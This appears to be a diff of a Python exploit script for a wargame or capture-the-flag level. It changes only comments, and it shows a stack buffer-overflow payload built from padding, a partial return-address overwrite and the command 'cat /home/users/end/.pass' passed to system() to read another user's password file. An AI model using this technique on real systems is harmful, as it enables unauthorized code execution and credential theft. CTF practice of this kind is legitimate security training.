@@ -10,15 +10,15 @@ padd = 'a'*0x28
 in1 = padd + '\xd0' + '\n'
 
 # The fgets in secret_backdoor will fail and return null.
-# So we will be reusing the same chars we wrote in the handle_msg
-# function to pass system().
+# So we will be reusing the same chars we wrote to the stack in the handle_msg
+# function as an argument to the system function.
 
 # First padd 0x48 because the diff between
-# handle_msg 0xc0 and secret_backddor 0x80 is
-# 0x40 plus 8 for the rbp.
+# handle_msg 0xc0 and secret_backddor 0x80 is 0x40
+# plus 8 because we don't add a new return pointer to the stack.
 padd1 = 'a'*0x48
-# Then add the string that we will be (rbp-0x80) passed
-# to the system call.
+# Then add the string that will be (rbp-0x80) passed
+# to the system function.
 system = 'cat /home/users/end/.pass '
 # handl_msg sub rsp,0xc0
 padd2 = 'b'*(0xc0 - len(padd) + 8)
